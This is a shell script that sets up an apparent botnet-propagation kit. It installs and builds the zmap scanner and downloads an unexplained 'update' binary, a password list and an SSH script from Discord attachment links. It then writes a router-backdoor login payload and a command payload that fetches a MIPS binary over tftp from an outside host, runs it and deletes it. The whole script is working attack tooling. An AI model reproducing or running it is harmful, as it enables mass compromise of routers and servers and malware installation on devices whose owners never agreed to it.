#!/bin/sh
# Auto install scanning by LogicNet Team

yum update -y
yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
yum install epel-release -y
yum install gengetopt -y
yum install wget -y
yum install python-paramiko -y

wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz
tar -xvf v2.1.0.tar.gz
cd zmap-2.1.0
flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l"
byacc -d -o "src/parser.c" "src/parser.y"
mkdir /etc/zmap
cp conf/* /etc/zmap
cmake -DENABLE_HARDENING=ON
make
make install
cd ..

wget https://cdn.discordapp.com/attachments/335729551873277954/605359436478939156/update
wget https://cdn.discordapp.com/attachments/335729551873277954/605359460109647882/pass_file
wget https://cdn.discordapp.com/attachments/706178556484386888/822805205674229810/ssh.py

python -c "print 'A'*8 + 'netcore\x00'" > loginpayload
python -c "print 'AA\x00\x00AAAA cd /var/; tftp -g -r mipselss 1.1.1.1; chmod 777 mipsel; ./mipsel; rm -rf mipsel\x00'" > commandpayload
